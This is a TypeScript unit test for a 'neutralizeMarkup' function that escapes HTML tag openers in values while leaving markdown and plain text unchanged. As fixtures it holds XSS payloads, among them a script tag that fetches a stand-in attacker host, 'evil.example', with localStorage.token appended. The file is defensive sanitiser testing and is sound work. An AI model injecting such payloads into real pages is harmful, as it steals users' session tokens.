import test from "node:test";
import assert from "node:assert/strict";

import { neutralizeMarkup } from "./neutralizeMarkup.ts";

test("a value cannot open an HTML tag", () => {
  assert.equal(
    neutralizeMarkup('<img src=x onerror="alert(1)">'),
    '&lt;img src=x onerror="alert(1)">',
  );
  assert.equal(
    neutralizeMarkup("<script>fetch('//evil.example/'+localStorage.token)</script>"),
    "&lt;script>fetch('//evil.example/'+localStorage.token)&lt;/script>",
  );
  assert.equal(neutralizeMarkup('<iframe srcdoc="<script>1</script>">'), '&lt;iframe srcdoc="&lt;script>1&lt;/script>">');
});

test("markdown formatting and ordinary text in a value are left alone", () => {
  for (const value of [
    "Acme **Ltd** & Sons",
    "> quoted line",
    "1 > 0",
    "[terms](https://example.com/terms)",
    "0xdAe7B57af2BE10b5Eca3f2835A1AB15537d8e844 on Sepolia",
  ]) {
    assert.equal(neutralizeMarkup(value), value);
  }
});
